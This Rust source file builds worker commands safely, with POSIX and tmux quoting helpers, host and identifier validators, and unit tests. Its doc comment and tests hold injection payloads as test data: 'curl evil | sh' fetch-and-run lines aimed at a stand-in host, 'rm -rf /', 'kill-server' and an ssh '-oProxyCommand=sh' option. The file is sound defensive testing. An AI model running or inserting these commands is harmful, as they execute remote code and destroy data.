//! Shell-safe construction of worker commands.
//!
//! Executors used to build a single command string with `format!` and hand it to
//! `bash -c` (or `ssh`), which made team names, model names and mission text a
//! shell-injection surface: a mission containing `'; curl evil | sh; '` ran on
//! every worker. Commands are now assembled as an argv vector and only quoted
//! at the very edge, where a shell is unavoidable.
//!
//! Two quoting helpers are provided:
//! * [`shell_quote`] produces POSIX single-quoted words for `bash -c`/`ssh`.
//! * [`percent_encode`] produces tmux-safe arguments, because tmux re-parses
//!   its command string and does not accept POSIX quoting.

/// Quotes one argument for a POSIX shell.
///
/// Every argument is wrapped in single quotes and embedded single quotes are
/// closed, escaped and reopened (`'` becomes `'\''`). The result is a single
/// word for any input, including `$(...)`, backticks, newlines and `;`.
pub fn shell_quote(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('\'');
    for c in value.chars() {
        if c == '\'' {
            quoted.push_str("'\\''");
        } else {
            quoted.push(c);
        }
    }
    quoted.push('\'');
    quoted
}

/// Quotes each argument and joins them into one shell command line.
pub fn shell_join<I, S>(args: I) -> String
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    args.into_iter()
        .map(|a| shell_quote(a.as_ref()))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Encodes an argument so tmux treats it as opaque text.
///
/// tmux splits its own command syntax on spaces, `;`, quotes and `#`, so
/// percent-encoding every byte outside a small safe set is the only reliable
/// way to pass arbitrary mission text through `split-window`.
pub fn percent_encode(value: &str) -> String {
    let mut out = String::with_capacity(value.len() * 3);
    for byte in value.as_bytes() {
        let safe = byte.is_ascii_alphanumeric()
            || matches!(
                *byte,
                b'-' | b'_' | b'.' | b'/' | b':' | b'=' | b',' | b'@' | b'+'
            );
        if safe {
            out.push(*byte as char);
        } else {
            out.push_str(&format!("%{:02X}", byte));
        }
    }
    out
}

/// Validates a value that is interpolated into a `tmux` target/session name.
pub fn is_safe_identifier(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 128
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '/'))
}

/// Rejects an untrusted remote host string that could be parsed as an ssh
/// option (e.g. `-oProxyCommand=...`) or smuggle extra arguments.
pub fn validate_remote_host(host: &str) -> anyhow::Result<()> {
    let valid = !host.is_empty()
        && !host.starts_with('-')
        && host.len() <= 253
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '@'));
    if valid {
        Ok(())
    } else {
        anyhow::bail!("invalid remote host '{}'", host)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quotes_single_quote_payloads() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn neutralizes_command_substitution() {
        let hostile = "$(curl evil.example | sh)";
        let quoted = shell_quote(hostile);
        assert_eq!(quoted, "'$(curl evil.example | sh)'");
        // The only quote characters are the delimiters; nothing can escape.
        assert_eq!(quoted.matches('\'').count(), 2);
    }

    #[test]
    fn joins_arguments_without_trailing_space() {
        assert_eq!(
            shell_join(["dreamswarm", "worker", "--team", "a b"]),
            "'dreamswarm' 'worker' '--team' 'a b'"
        );
    }

    #[test]
    fn percent_encoding_removes_tmux_metacharacters() {
        let encoded = percent_encode("x; rm -rf / # $(id)");
        assert!(!encoded.contains(';'));
        assert!(!encoded.contains(' '));
        assert!(!encoded.contains('#'));
        assert!(!encoded.contains('$'));
        assert!(encoded.starts_with("x%3B%20rm"));
    }

    #[test]
    fn validates_remote_hosts() {
        assert!(validate_remote_host("build@example.com").is_ok());
        assert!(validate_remote_host("example.com:2222").is_ok());
        assert!(validate_remote_host("-oProxyCommand=sh").is_err());
        assert!(validate_remote_host("host; rm -rf /").is_err());
        assert!(validate_remote_host("").is_err());
    }

    #[test]
    fn flags_unsafe_tmux_identifiers() {
        assert!(is_safe_identifier("team-1"));
        assert!(is_safe_identifier("main:0.1"));
        assert!(!is_safe_identifier("team;kill-server"));
        assert!(!is_safe_identifier("team 1"));
    }
}
